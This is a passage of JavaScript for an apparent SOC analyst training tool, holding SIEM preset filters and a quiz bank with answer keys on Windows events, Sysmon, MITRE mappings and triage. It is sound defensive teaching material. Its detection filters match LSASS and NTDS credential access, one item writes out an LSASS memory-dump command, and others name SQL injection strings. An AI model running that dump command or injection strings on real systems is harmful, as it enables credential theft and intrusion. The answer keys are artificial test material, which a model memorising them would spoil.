      { id: "intel-185.220.101.7" },
      { id: "intel-mxfwd-server.net" },
      { id: "search-imap", keyword: "imap" },
      { id: "search-forward", keyword: "forward" },
      { id: "user-p.winters" }
    ]
  }
];

/* preset SIEM queries available on the investigation screen */
const PRESET_QUERIES = [
  { label: "All events", filter: null },
  { label: "Failed logons (4625)", filter: ev => ev.id === "4625" },
  { label: "Successful logons (4624/4672)", filter: ev => ev.id === "4624" || ev.id === "4672" },
  { label: "Process creation (4688/Sysmon 1)", filter: ev => ev.id === "4688" || (ev.id === "1" && ev.type === "sysmon") },
  { label: "Network connections (Sysmon 3)", filter: ev => ev.id === "3" && ev.type === "sysmon" },
  { label: "Persistence (4698/7045/Run)", filter: ev => ev.id === "4698" || ev.id === "7045" || /currentversion\\run/i.test(ev.detail) || ev.id === "13" },
  { label: "Credential access (Sysmon 10/11, lsass)", filter: ev => ev.id === "10" || /lsass/i.test(ev.detail) || /ntds/i.test(ev.detail) },
  { label: "Kerberos (4769/4771)", filter: ev => ev.id === "4769" || ev.id === "4771" },
  { label: "DNS queries (Sysmon 22)", filter: ev => ev.id === "22" && ev.type === "sysmon" },
  { label: "Defense evasion (1102/4719)", filter: ev => ev.id === "1102" || ev.id === "4719" },
  { label: "Email events", filter: ev => ev.type === "email" },
  { label: "Cloud identity events", filter: ev => ev.type === "cloud" }
];

const QUIZ = [
  { q: "Event 4624 with LogonType 10 indicates which type of logon?",
    o: ["Remote Interactive (RDP)", "Network (SMB)", "Local console", "Service"], a: 0, tag: "Events",
    e: "LogonType 10 = RemoteInteractive, i.e. an RDP session. Type 2 = interactive console, Type 3 = network, Type 5 = service." },
  { q: "Event 4625 with Status 0xC000006A means:",
    o: ["Account locked out", "Account disabled", "Wrong password (bad credentials)", "Bad username"], a: 2, tag: "Events",
    e: "0xC000006A = wrong password - the classic brute-force / password-spray failure code. 0xC000006D = bad username (enumeration)." },
  { q: "Which Event ID fires when the Windows Security audit log is cleared?",
    o: ["7045", "4719", "4720", "1102"], a: 3, tag: "Events",
    e: "Event 1102 = audit log cleared, a key anti-forensics indicator (T1070.001). Always investigate who cleared it and what happened before/after." },
  { q: "Sysmon Event ID 1 captures:",
    o: ["Network connections", "Process Create (with full command line + hashes)", "Registry changes", "DNS queries"], a: 1, tag: "Sysmon",
    e: "Sysmon EID 1 always includes the full command line, parent GUID + command line, hashes, integrity level, and OriginalFileName - superior to Windows 4688." },
  { q: "Which Sysmon Event ID detects a process opening LSASS memory (credential dumping)?",
    o: ["8 (CreateRemoteThread)", "3 (Network)", "10 (ProcessAccess)", "13 (Registry set)"], a: 2, tag: "Sysmon",
    e: "EID 10 logs OpenProcess calls. SourceImage=powershell/mimikatz, TargetImage=lsass.exe, GrantedAccess incl. 0x1000/0x1010/0x1FFFFF = credential theft (T1003.001)." },
  { q: "Sysmon Event ID 8 indicates:",
    o: ["CreateRemoteThread - cross-process code injection", "Process tampering", "Driver load", "Pipe creation"], a: 0, tag: "Sysmon",
    e: "EID 8 = CreateRemoteThread, the classic code-injection primitive (T1055). High-value targets: lsass, svchost, explorer, browsers." },
  { q: "Sysmon Event ID 22 logs:",
    o: ["Clipboard changes", "Named pipes", "WMI subscriptions", "DNS queries"], a: 3, tag: "Sysmon",
    e: "EID 22 = DNS queries. Look for DGA (high entropy, NXDOMAIN), tunneling (long labels, TXT), and non-browser processes querying DNS (T1071.004)." },
  { q: "Process tree: OUTLOOK.EXE → WINWORD.EXE → powershell.exe -enc ... most strongly suggests:",
    o: ["A scheduled maintenance script", "Phishing with a macro / OLE document", "EDR self-scan", "Legitimate software update"], a: 1, tag: "Triage",
    e: "Office → shell is the signature of macro/phishing initial access (T1566.001 → T1059.001). The parent chain reveals the vector." },
  { q: "Your first action when an alert lands in your queue is to:",
    o: ["Call the SOC manager", "Immediately block the source IP", "Isolate the host", "Parse the alert metadata (rule, entities, time)"], a: 3, tag: "Triage",
    e: "Triage starts by parsing: what triggered it, which host/user/process, and when. Containment and escalation decisions come after context." },
  { q: "What is the difference between a False Positive and a Benign Positive?",
    o: ["FP = real attack; BP = test attack", "FP means unknown; BP means confirmed", "FP = detection logic error (no malicious activity); BP = alert correctly fired on authorized activity", "They are the same thing"], a: 2, tag: "Concepts",
    e: "FP: the rule fired but there is no malicious activity (bad logic/data). BP: the rule correctly identified activity that turns out to be authorized (admin script, vuln scanner)." },
  { q: "Service accounts most commonly authenticate with which logon types?",
    o: ["3 (Network) and 8 (Cleartext)", "4 (Batch) and 5 (Service)", "2 (Interactive) and 10 (RDP)", "11 (Cached)"], a: 1, tag: "Events",
    e: "Batch (scheduled tasks) and Service. Interactive/RDP (2, 10) on a service account is a strong red flag." },
  { q: "Kerberoasting maps to which MITRE technique?",
    o: ["T1558.003", "T1550.002", "T1003.001", "T1110.003"], a: 0, tag: "MITRE",
    e: "T1558.003 Kerberoasting: requesting RC4 service tickets (4769, 0x17) to crack SPN account passwords offline." },
  { q: "Which ATT&CK tactic ID covers credential theft (LSASS, Kerberoasting)?",
    o: ["TA0003 Persistence", "TA0008 Lateral Movement", "TA0001 Initial Access", "TA0006 Credential Access"], a: 3, tag: "MITRE",
    e: "TA0006 = Credential Access (crown jewel: T1003.001 LSASS dumping)." },
  { q: "The P1 acknowledge SLA is:",
    o: ["2 hours", "8 hours", "15 minutes", "30 minutes"], a: 2, tag: "Severity",
    e: "P1: ack 15 min, contain 1 hr. P2: ack 30 min, contain 4 hrs. P3: ack 2 hrs. P4: 8 hrs / batch." },
  { q: "A P3 'Suspicious PowerShell' alert fires on a Domain Controller (Tier 0 asset). Final priority?",
    o: ["P1", "P2 (tier multiplier)", "P4", "P3 (unchanged)"], a: 1, tag: "Severity",
    e: "Asset tier multiplies severity: P3 on Tier 0 becomes P2 (or P1 in privileged context). Tier 0 compromise = keys to the kingdom." },
  { q: "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump <pid> <file> full is used to:",
    o: ["Dump LSASS and steal credentials", "Install a service", "Create a scheduled task", "Enumerate AD groups"], a: 0, tag: "Concepts",
    e: "comsvcs.dll MiniDump is a classic LOLBin credential dump (T1003.001) - often paired with Sysmon EID 10 showing the LSASS access." },
  { q: "Adding a value to HKCU\\...\\CurrentVersion\\Run maps to which MITRE technique?",
    o: ["T1547.001 (Registry Run Keys / Startup Folder)", "T1543.003 (Service)", "T1134 (Token Manipulation)", "T1053.005 (Scheduled Task)"], a: 0, tag: "MITRE",
    e: "Run/RunOnce keys are the most common persistence location (T1547.001). Detect via Sysmon EID 12/13 or 4657." },
  { q: "Which of these is a strong indicator of a DGA (domain generation algorithm)?",
    o: ["Large HTTP POST to a CDN", "A static IP beaconing on 443", "A single TLS connection", "High-entropy domains with NXDOMAIN responses"], a: 3, tag: "Concepts",
    e: "DGA: high-entropy hostnames, heavy NXDOMAIN volume, regular query intervals (T1568.002 / T1071.004)." },
  { q: "A Golden Ticket is:",
    o: ["A SAM registry dump", "A dumped DA password", "A forged TGT signed with the krbtgt hash", "A Pass-the-Hash attack"], a: 2, tag: "MITRE",
    e: "Golden ticket = forged TGT using the krbtgt account hash (T1558.001). Indicators: anomalous TGT lifetime, krbtgt password age > 180 days." },
  { q: "The common threshold for 'impossible travel' in sign-in analytics is:",
    o: ["Two different countries in a day", "Speed above ~1000 km/h between sign-ins", "A VPN exit IP", "Any new device"], a: 1, tag: "Concepts",
    e: "If two successful sign-ins imply travel faster than a plane (~1000 km/h), it is impossible-travel (with distance/time correlation)." },
  { q: "Event 4769 requests with TicketEncryptionType 0x17 (RC4) against service accounts indicate:",
    o: ["AS-REP roasting", "Kerberoasting", "Pass-the-Hash", "Golden ticket forgery"], a: 1, tag: "Events",
    e: "RC4 TGS-REQs (0x17) for SPN accounts, in volume, from one source = Kerberoasting (T1558.003)." },
  { q: "Which trait best describes C2 beaconing?",
    o: ["A single burst then silence", "One huge random download", "No outbound traffic", "Regular interval, small packets, long-lived"], a: 3, tag: "Concepts",
    e: "Beaconing: periodic, low-volume check-ins at a steady interval (with jitter) to the same destination (T1071.001)." },
  { q: "Which technique ID covers ransomware encryption of data?",
    o: ["T1567 (Exfil to Web)", "T1490 (Inhibit System Recovery)", "T1486 (Data Encrypted for Impact)", "T1036 (Masquerading)"], a: 2, tag: "MITRE",
    e: "T1486 = Data Encrypted for Impact. Watch also for T1490 (vssadmin delete shadows) alongside." },
  { q: "Event 4719 indicates:",
    o: ["System audit policy was changed", "The log was cleared", "A service was installed", "A user was added to a group"], a: 0, tag: "Events",
    e: "4719 = audit policy changed - an attacker disabling/altering logging to evade detection (T1562.002)." },
  { q: "What MUST be in an L1 → L2 escalation package?",
    o: ["The user's name", "A list of IPs", "Alert details, host/user context, process tree, command lines, network + TI, hashes, auth timeline, MITRE mapping, containment taken", "Just the alert ID"], a: 2, tag: "Triage",
    e: "A complete package lets L2 act immediately. Missing pieces force L2 to re-do your triage - the #1 escalation mistake." },
  { q: "Severity vs Priority: ransomware on a test-lab server (low business value) would be:",
    o: ["P1 priority automatically", "P1 severity but P3/P4 priority", "P4 severity", "Never escalated"], a: 1, tag: "Severity",
    e: "Severity = technical criticality (P1), priority = business urgency (downgraded on a test box). Severity ≠ priority." },
  { q: "Event 4672 fires when:",
    o: ["A process is created", "An account is locked", "A password is wrong", "A logon has elevated (admin-equivalent) privileges"], a: 3, tag: "Events",
    e: "4672 = special privileges assigned (SeDebug, SeTcb, etc.). 4624 Type 10 + 4672 = privileged RDP session - high value." },
  { q: "Spearphishing with an attachment maps to which tactic?",
    o: ["TA0001 Initial Access", "TA0008 Lateral Movement", "TA0003 Persistence", "TA0002 Execution"], a: 0, tag: "MITRE",
    e: "Phishing is Initial Access (TA0001); the technique is T1566.001 Spearphishing Attachment." },
  { q: "Which file path is most suspicious for a new executable in Sysmon EID 1/11?",
    o: ["C:\\Users\\<name>\\AppData\\Local\\Temp\\...", "C:\\Windows\\Servicing\\...", "C:\\Program Files\\...", "C:\\Windows\\System32\\..."], a: 0, tag: "Sysmon",
    e: "Temp/AppData execution = malware drop. System32/Program Files are expected locations for legitimate binaries." },
  { q: "MFA fatigue (push-bombing) maps to which technique?",
    o: ["T1566 (Phishing)", "T1550 (Alternate Auth Material)", "T1621 (MFA Request Generation)", "T1110 (Brute Force)"], a: 2, tag: "MITRE",
    e: "T1621 = flooding the user with push prompts until they accidentally approve. Detect via multiple denials then approval from a new device." },
  { q: "Which Event ID is raised when a scheduled task is created?",
    o: ["7045", "1102", "4720", "4698"], a: 3, tag: "Events",
    e: "4698 = scheduled task created (persistence, T1053.005). 7045 = service installed. Check Author, Command, and Trigger fields." },
  { q: "IOCs in a SOC ticket should be recorded as:",
    o: ["A paste of raw logs", "Structured Type / Value / Confidence / Source", "Notes in free text", "IPs only"], a: 1, tag: "Triage",
    e: "Structured IOCs (IPv4, domain, file hash, URL) with confidence + source make the ticket actionable and auditable." },
  { q: "A newly registered domain (< 30 days old) contacted by an internal host is best described as:",
    o: ["Patched automatically", "Always benign", "Suspicious - a common C2 / phishing pattern", "Irrelevant to triage"], a: 2, tag: "Concepts",
    e: "Young domains + odd TLDs + low traffic = common C2 infrastructure (T1583.001). Age/reputation is a core enrichment step." },
  { q: "Port 1433 in a network connection event most likely indicates:",
    o: ["MSSQL database traffic (xp_cmdshell lateral movement risk)", "DNS resolution", "SSH tunneling", "NTP time sync"], a: 0, tag: "Network",
    e: "TCP 1433 = MSSQL. Watch for xp_cmdshell / OLE automation abuse (T1190 / lateral movement) and large data pulls." },
  { q: "Which service does TCP port 445 commonly expose?",
    o: ["Kerberos", "SMB (lateral movement, PsExec, ransomware)", "RDP", "SNMP"], a: 1, tag: "Network",
    e: "445 = SMB. Heavy SMB from one host to many = worm/lateral movement (T1021.002); SMBv1 is especially risky." },
  { q: "A DNS query flood of long, high-entropy subdomains to one domain is a classic sign of:",
    o: ["A misconfigured mail server", "Local DNS caching", "Legitimate CDN routing", "DNS tunneling / data exfiltration"], a: 3, tag: "Network",
    e: "Long subdomains (>50 chars) with high entropy are the hallmark of DNS tunneling (T1048.001) — data hidden in query names, often TXT/NULL records." },
  { q: "Which DNS record type is commonly abused to exfiltrate data (base64 payload in responses)?",
    o: ["TXT", "NS", "AAAA", "A"], a: 0, tag: "Network",
    e: "TXT records can carry arbitrary text, so tunnellers use TXT (and NULL) to smuggle data. Spike in TXT queries = investigate." },
  { q: "Which DNS response code indicates a domain that does not exist, useful for spotting DGA-generated queries?",
    o: ["REFUSED (5)", "SERVFAIL (2)", "NOERROR (0)", "NXDOMAIN (3)"], a: 3, tag: "Network",
    e: "NXDOMAIN (3) = name not found. DGA malware queries many random domains that don't resolve, producing a high NXDOMAIN rate (T1568.002)." },
  { q: "An HTTP response 401 vs 403 tells you:",
    o: ["403 = server crashed", "They mean the same thing", "401 = not authenticated yet; 403 = authenticated but not allowed", "401 = resource moved"], a: 2, tag: "Web",
    e: "401 = authentication required/missing; 403 = forbidden (authenticated or otherwise denied). A 403 followed by many 200s can signal auth bypass probing." },
  { q: "Which OWASP risk is being exploited when user input is concatenated straight into an SQL query?",
    o: ["Broken Access Control (A01)", "Injection (A03)", "Security Misconfiguration (A05)", "SSRF (A10)"], a: 1, tag: "Web",
    e: "SQLi is Injection (A03). Look for ' OR 1=1, UNION SELECT, time-based SLEEP/WAITFOR patterns in web/proxy logs." },
  { q: "A WAF alert firing on a request containing \"UNION SELECT\" most likely indicates:",
    o: ["A CSRF token", "An XSS payload", "A normal API call", "SQL injection attempt"], a: 3, tag: "Web",
    e: "UNION SELECT is a classic in-band SQLi signature. Correlate with source reputation and whether the request succeeded (403 bypass is worse)." },
  { q: "Which Linux file lists all user accounts (human users usually UID >= 1000)?",
    o: ["/etc/shadow", "/etc/sudoers", "/etc/passwd", "/var/log/auth.log"], a: 2, tag: "Linux",
    e: "/etc/passwd = accounts (readable by all). /etc/shadow holds hashes (root only) — access to it is a hash-dump indicator (T1003.008)." },
  { q: "SSH brute-force / credential attacks on Linux are best spotted in which log?",
    o: ["/var/log/kern.log", "/var/log/auth.log (Failed password / Accepted)", "systemd journal only at boot", "nginx access.log"], a: 1, tag: "Linux",
    e: "auth.log records sshd 'Failed password' bursts and 'Accepted' events. A success right after many failures = compromised account (T1110)." },
  { q: "On a Linux host, persistence is most commonly found in all of the following EXCEPT:",
    o: ["Registry Run keys", "~/.bashrc and authorized_keys", "systemd services", "crontab / cron.d"], a: 0, tag: "Linux",
    e: "Registry is Windows-only. Linux persistence = cron (T1053.003), systemd units, rc.local, .bashrc, and ~/.ssh/authorized_keys backdoors." },
  { q: "In AWS, which IAM entity lets an EC2 instance obtain temporary credentials instead of embedded keys?",
    o: ["Role (STS AssumeRole)", "Access Key", "IAM Policy", "User group"], a: 0, tag: "Cloud",
    e: "Roles mint short-lived STS session tokens — the secure default. Long-term AKIA keys embedded in code are a leak risk (T1098.001)." },
  { q: "Compromised AWS access keys usually start with which prefix?",
    o: ["AIDA", "ASIA", "SKIA", "AKIA"], a: 3, tag: "Cloud",
    e: "AKIA = long-term access key ID. ASIA = temporary session token (usually fine). Seeing AKIA pasted in a repo/chat = leaked credential." },
  { q: "Which TLS artifact lets you fingerprint malware C2 even though the traffic is encrypted?",
    o: ["The destination port only", "The HTTP User-Agent", "JA3/JA3S client fingerprint", "The TLS record size is always fixed"], a: 2, tag: "Concepts",
    e: "JA3 hashes the ClientHello (cipher suites, extensions) — a stable fingerprint. Cobalt Strike & commodity RATs have known JA3 signatures." },
  { q: "Event 4624 with LogonType 9 (NewCredentials) indicates:",
    o: ["An RDP session", "RunAs /netonly — alternate credentials used for remote access", "A scheduled task ran", "A failed logon"], a: 1, tag: "Events",
    e: "LogonType 9 = NewCredentials, minted by RunAs /netonly. It is a lateral-movement / credential-use tell (T1134 token manipulation)." },
  { q: "Event 4728 records:",
    o: ["A user account was created", "A user added to a security-enabled global group (e.g. Domain Admins)", "A password was reset", "A logon failure"], a: 1, tag: "Events",
    e: "4728 = member added to a global security group. A standard user added to Domain Admins via 4728 is instant privilege escalation (T1098)." },
  { q: "Event 4732 records:",
    o: ["A service installed", "A DNS query", "An account locked out", "A user added to a domain-local group (e.g. local admins / RDP)"], a: 3, tag: "Events",
    e: "4732 = member added to a domain-local group. Watch for Remote Desktop Users / Administrators additions (T1098)." },
  { q: "Event 4740 fires when:",
    o: ["An account is locked out", "A user logs on successfully", "A share is accessed", "A process starts"], a: 0, tag: "Events",
    e: "4740 = account locked out. Correlate with 4625 failures to separate brute force from lockout policy problems." },
  { q: "Event 4647 indicates:",
    o: ["A privilege was assigned", "A password expired", "A user initiated logoff", "An account was created"], a: 2, tag: "Events",
    e: "4647 = user-initiated logoff. Missing 4647 after a successful 4624 may hint at a killed session." },
  { q: "Event 4768 is a:",
    o: ["Kerberos service ticket request (TGS-REQ)", "LDAP bind", "NTLM logon", "Kerberos TGT request (AS-REQ)"], a: 3, tag: "Events",
    e: "4768 = AS-REQ (TGT request). AS-REP roasting shows as 4768 with pre-auth failures; unusual volumes warrant review." },
  { q: "Event 4771 indicates:",
    o: ["Successful Kerberos authentication", "Password change", "Kerberos pre-authentication failed", "Account lockout"], a: 2, tag: "Events",
    e: "4771 = pre-auth failure. A spike of 4771 for one account = Kerberos password spray (T1110.002)." },
  { q: "Event 5140 records:",
    o: ["A file was deleted", "A network share object was accessed", "A user was added to a group", "A service started"], a: 1, tag: "Events",
    e: "5140 = share accessed. Sudden SMB share enumeration from one host = lateral-movement / data-staging reconnaissance (T1083)." },
  { q: "Event 4723 vs 4724:",
    o: ["4723 = self-service password change; 4724 = admin reset attempt", "They mean the same thing", "4723 = group change; 4724 = user change", "4723 = lockout; 4724 = unlock"], a: 0, tag: "Events",
    e: "4723 = the user changed their own password; 4724 = an admin reset it. Mass 4724s to service accounts = attacker rotating passwords to lock you out (T1531)." },
  { q: "A burst of 4625 failures with Status 0xC000006D (bad username) against many different names suggests:",
    o: ["A lockout policy problem", "A normal maintenance script", "Kerbéros misconfiguration", "Username enumeration / spraying"], a: 3, tag: "Events",
    e: "0xC000006D = bad username. Spraying many unknown names is account discovery / enumeration (T1087, T1110.003)." },
  { q: "Event 4657 records:",
    o: ["A registry value modification", "A network connection", "An email delivery", "A process creation"], a: 0, tag: "Events",
    e: "4657 = registry value changed (when Audit Registry enabled). Persistence keys (Run, services) show up here (T1547.001)." },
  { q: "Event 7036 records:",
    o: ["A scheduled task creation", "A service state change (started / stopped)", "A firewall change", "A user logon"], a: 1, tag: "Events",
    e: "7036 = service state change. A new service starting at 03:00 from an odd path is worth correlating with 7045/4697 (T1543.003)." },
  { q: "Sysmon Event ID 6 logs:",
    o: ["DNS query", "Process image loaded into memory", "Driver loaded", "Named pipe"], a: 2, tag: "Sysmon",
    e: "EID 6 = DriverLoad. Unsigned/kernel drivers (or known vulnerable ones) load here — watch for BYOVD (T1543.003 / T1068)." },
  { q: "Sysmon Event ID 7 logs:",
    o: ["Network connection", "Registry change", "File created", "ImageLoaded (DLL mapped into a process)"], a: 3, tag: "Sysmon",
    e: "EID 7 = ImageLoaded. Anomalous DLLs loaded by Office/PowerShell (e.g. from %TEMP%) indicate script/reflective loading (T1055)." },
  { q: "Sysmon Event IDs 12 / 13 / 14 cover:",
    o: ["Service installation", "Registry create / value set / key rename", "Scheduled tasks", "Named pipes"], a: 1, tag: "Sysmon",
    e: "12/13/14 = registry events. Run keys, services, and COM hijack values surface here (T1547.001, T1543.003, T1546)." },
  { q: "Sysmon Event IDs 17 / 18 log:",
    o: ["Named pipe created / connected", "File deletion", "Clipboard changes", "Process injection"], a: 0, tag: "Sysmon",
    e: "17/18 = pipe create/connect. C2 frameworks (e.g. some post-exploitation tools) and miners use named pipes for IPC (T1105 / T1570)." },
  { q: "Sysmon Event ID 23 logs:",
    o: ["File creation", "DNS query", "File delete (archived)", "Process access"], a: 2, tag: "Sysmon",
    e: "EID 23 = FileDelete archived. Attackers deleting tools/temp files after use leaves artifacts here (T1070.004)." },
  { q: "Sysmon Event ID 25 logs:",
    o: ["Driver load", "Process tampering (PATCH / code modified)", "Service install", "WMI event"], a: 1, tag: "Sysmon",
    e: "EID 25 = ProcessTampering. In-memory patching / hollowing of a legit process is a strong evasion indicator (T1055)." },
  { q: "Sysmon Event ID 26 logs:",
    o: ["File delete detected (with file path)", "Service stopped", "Process created", "Log cleared"], a: 0, tag: "Sysmon",
    e: "EID 26 = FileDeleteDetected. Combines with 23 for covering-tracks forensics (T1070.004)." },
  { q: "Sysmon Event ID 3 records:",
    o: ["Only the destination port", "Only the process name", "Source/dest IP, ports, protocol, and the owning process", "The full URL visited"], a: 2, tag: "Sysmon",
    e: "EID 3 = NetworkConnect: process-level outbound connections. It is the backbone of beaconing / C2 detection (T1071)." },
  { q: "To detect a process creating a remote thread inside another process (injection), use Sysmon:",
    o: ["24 (ClipboardChange)", "26 (FileDeleteDetected)", "15 (FileCreateStreamHash)", "8 (CreateRemoteThread)"], a: 3, tag: "Sysmon",
    e: "EID 8 = CreateRemoteThread — the classic injection primitive (T1055). Suspicious when the target is lsass/svchost/Office." },
  { q: "The FIRST question an L1 should ask on any alert is:",
    o: ["Can I block the IP?", "Who is the SOC manager?", "How do I close this fast?", "Is this real, and what evidence supports it?"], a: 3, tag: "Triage",
    e: "Validation comes before action. Ask what triggered the rule and confirm the underlying activity before any containment." },
  { q: "The correct triage sequence is:",
    o: ["Ignore → document → close", "Validate → enrich → build timeline → classify → escalate", "Block → isolate → investigate", "Escalate → validate → close"], a: 1, tag: "Triage",
    e: "Gather context first, then decide. Jumping to containment on an unvalidated alert creates noise and outages." },
  { q: "A timeline in triage should:",
    o: ["Reconstruct the attack chain chronologically across all log sources", "List only blocked attempts", "Show only successful logons", "Show only the current alert"], a: 0, tag: "Triage",
    e: "Timelines connect the dots: initial access → execution → persistence → C2. That is what escalation needs." },
  { q: "Two alerts on different hosts share one source IP. The L1 should:",
    o: ["Close both as duplicates", "Ignore the IP", "Correlate them — one actor or one campaign", "Handle only the newest one"], a: 2, tag: "Triage",
    e: "Shared indicators across hosts turn single alerts into a campaign. Correlation is core L1 work (T1190 / T1021)." },
  { q: "The purpose of evidence collection during triage is:",
    o: ["To let L2/IR act immediately without re-triaging", "To prove the analyst worked", "To fill disk space", "To delay escalation"], a: 0, tag: "Triage",
    e: "A complete package (logs, hashes, IPs, timeline, MITRE) shortens response time — the #1 escalation expectation." },
  { q: "A false negative is the most dangerous outcome because:",
    o: ["It blocks legitimate users", "It fires too often", "It uses too much CPU", "Real malicious activity was missed entirely"], a: 3, tag: "Triage",
    e: "A missed attack = no detection = attacker keeps moving. FN is worse than FP for security outcomes." },
  { q: "Alert fatigue is best addressed by:",
    o: ["Deleting the SIEM", "Hiring staff to read everything", "Rule tuning, deduplication, and risk-based prioritization", "Disabling alerts"], a: 2, tag: "Triage",
    e: "Reduce noise at the source and triage by risk; otherwise good analysts start ignoring real alerts." },
  { q: "An L1 ticket should be:",
    o: ["A single sentence", "Structured, objective, evidence-backed, and escalation-ready", "Only the alert ID", "A long stream of consciousness"], a: 1, tag: "Triage",
    e: "A ticket is the product. Structure (timeline, IOCs, classification, actions) is what makes it auditable and useful." },
  { q: "Dwell time measures:",
    o: ["Time to respond to an alert", "Time to write a ticket", "Time to patch a server", "Time from initial compromise to detection"], a: 3, tag: "Concepts",
    e: "Dwell time = how long an attacker was inside before detection. Reducing it is a core SOC goal." },
  { q: "MTTD stands for:",
    o: ["Mean Time To Detect", "Minimum Time To Diagnose", "Median Time To Dismiss", "Mean Time To Deploy"], a: 0, tag: "Concepts",
    e: "MTTD = how fast the SOC detects incidents — measured from compromise to detection." },
  { q: "MTTR stands for:",
    o: ["Most Time To React", "Minimum Time To Reboot", "Mean Time To Respond / Recover", "Mean Total Time Recorded"], a: 2, tag: "Concepts",
    e: "MTTR = how fast the SOC contains and recovers. Paired with MTTD, it is the SOC's speed metric." },
  { q: "In the cyber kill chain, 'Actions on Objectives' follows:",
    o: ["Exploitation", "Command & Control", "Delivery", "Reconnaissance"], a: 1, tag: "Concepts",
    e: "Order: Recon → Weaponize → Deliver → Exploit → Install → C2 → Actions on Objectives." },
  { q: "The Diamond Model's four vertices are:",
    o: ["Malware, Phishing, Ransomware, DDoS", "Attacker, Target, Time, Place", "Adversary, Infrastructure, Capability, Victim", "Host, Network, User, Data"], a: 2, tag: "Concepts",
    e: "Diamond = Adversary + Infrastructure + Capability + Victim. Great for structuring correlations." },
  { q: "Defense in depth means:",
    o: ["Encrypting all traffic", "One very strong firewall", "More passwords", "Multiple overlapping security layers so a single failure isn't fatal"], a: 3, tag: "Concepts",
    e: "Layered controls (EDR, network, identity, email) mean attackers must break several defenses, buying detection time." },
  { q: "For a credential-based attack, the FIRST logs to review are:",
    o: ["Authentication logs (4624 / 4625, 4768/4769)", "Anti-virus logs", "Physical access logs", "Web access logs"], a: 0, tag: "Concepts",
    e: "Auth logs are ground truth for logon abuse — before touching web/AV logs, check who logged in from where." },
  { q: "In a SOC, 'alert triage' refers to:",
    o: ["Running phishing simulations", "Sorting and validating alerts to decide whether action is needed", "Writing detection rules", "Configuring the SIEM"], a: 1, tag: "Concepts",
    e: "Triage is the L1's job: priority-sort, validate, enrich, decide to act or escalate." },
  { q: "Exploiting a public-facing application maps to which technique?",
    o: ["T1053.005", "T1547.001", "T1190", "T1566.002"], a: 2, tag: "MITRE",
    e: "T1190 = Exploit Public-Facing Application (e.g. SQLi, RCE on a portal)." },
  { q: "TA0002 is which MITRE tactic?",
    o: ["Lateral Movement", "Discovery", "Persistence", "Execution"], a: 3, tag: "MITRE",
    e: "TA0002 = Execution — running attacker code (PowerShell, schtasks, services)." },
  { q: "T1059.001 is:",
    o: ["Scheduled Task", "PowerShell (Command and Scripting Interpreter)", "Windows Service", "Registry Run Keys"], a: 1, tag: "MITRE",
    e: "T1059.001 = PowerShell abuse. Most L1 alerts involving PowerShell map here first." },
  { q: "Creating a Windows service as persistence maps to:",
    o: ["T1543.003", "T1053.005", "T1566.001", "T1547.001"], a: 0, tag: "MITRE",
    e: "T1543.003 = Create/Modify System Process: Windows Service. Detected via 7045/4697." },
  { q: "Pass-the-Hash is which technique?",
    o: ["T1550.002", "T1110.003", "T1003.001", "T1558.003"], a: 0, tag: "MITRE",
    e: "T1550.002 = Use Alternate Authentication Material: Pass the Hash — replaying a captured NTLM hash." },
  { q: "Which tactic covers moving from one host to another?",
    o: ["TA0003 Persistence", "TA0005 Defense Evasion", "TA0008 Lateral Movement", "TA0004 Privilege Escalation"], a: 2, tag: "MITRE",
    e: "TA0008 = Lateral Movement (SMB, RDP, WinRM, PsExec)." },
  { q: "Clearing the Windows Security log maps to:",
    o: ["T1105", "T1070.001", "T1490", "T1059.001"], a: 1, tag: "MITRE",
    e: "T1070.001 = Clear Windows Event Logs. Event 1102 is the smoking gun." },
  { q: "Bringing tools onto a compromised host (download cradle, payload) is:",
    o: ["T1071.001", "T1568.002", "T1041", "T1105 Ingress Tool Transfer"], a: 3, tag: "MITRE",
    e: "T1105 = Ingress Tool Transfer — curl/PowerShell/BITS pulling attacker tooling." },
  { q: "Valid Accounts (T1078) is dangerous because:",
    o: ["It is always detected", "It is easy to block", "It uses legitimate credentials that blend into normal traffic", "It only works on Linux"], a: 2, tag: "MITRE",
    e: "T1078 uses real creds — no exploits, no malware signatures. Detection relies on behavior/anomalies." },
  { q: "Lateral movement via RDP maps to:",
    o: ["T1558.003", "T1021.001", "T1021.002", "T1190"], a: 1, tag: "MITRE",
    e: "T1021.001 = Remote Services: RDP. Watch 4624 LogonType 10 to non-standard hosts." },
  { q: "The P2 acknowledge SLA is:",
    o: ["8 hours", "15 minutes", "2 hours", "30 minutes"], a: 3, tag: "Severity",
    e: "P2: ack 30 min, contain 4 hrs. P1: 15 min / 1 hr. P3: 2 hrs. P4: 8 hrs." },
  { q: "A P1 incident typically requires:",
    o: ["Immediate escalation + full IR + management comms", "Closing within 24 hours", "No escalation", "A ticket only"], a: 0, tag: "Severity",
    e: "P1 = business-critical: immediate IR, incident commander, management notification." },
  { q: "Severity is about ____; Priority is about ____.",
    o: ["Detection / response", "Technical impact / business urgency", "Money / time", "Business urgency / technical impact"], a: 1, tag: "Severity",
    e: "Severity = how bad technically (P1-P4); priority = business urgency after applying asset criticality." },
  { q: "A P3 alert fires on a Domain Controller (Tier 0). Final priority?",
    o: ["Rises — tier multiplier pushes it to P2/P1", "Becomes a non-event", "Stays P3", "Drops to P4"], a: 0, tag: "Severity",
    e: "Asset tier multiplies severity. Tier 0 = crown jewels; same alert on a DC is always more urgent." },
  { q: "The SLA clock for an alert starts:",
    o: ["When L2 escalates", "When the ticket is closed", "At end of shift", "When the alert fires / is assigned to the queue"], a: 3, tag: "Severity",
    e: "SLA begins at alert creation — acknowledgement and containment must beat the threshold." },
  { q: "An acknowledged SLA being missed should:",
    o: ["Be ignored", "Be deleted", "Trigger an escalation path / manager notification", "Wait until the next day"], a: 2, tag: "Severity",
    e: "Missed SLAs auto-escalate in mature SOCs so incidents never fall through the cracks." },
  { q: "Which of these is a P1 event?",
    o: ["A single phishing email (no click)", "A disk space warning", "Domain-wide credential compromise / ransomware", "A known false positive"], a: 2, tag: "Severity",
    e: "P1 = critical business impact: domain compromise, ransomware, mass data exfil." },
  { q: "TCP port 3389 is:",
    o: ["RDP (remote desktop)", "SMB", "HTTPS", "MSSQL"], a: 0, tag: "Network",
    e: "3389 = RDP. External or off-hours RDP is a top lateral-movement vector (T1021.001)." },
  { q: "TCP/UDP port 53 carries:",
    o: ["HTTP", "DNS", "FTP", "NTP"], a: 1, tag: "Network",
    e: "53 = DNS. Watch for tunneling (TXT/long labels), DGA NXDOMAIN storms, and odd query volumes." },
  { q: "A beacon with jitter is:",
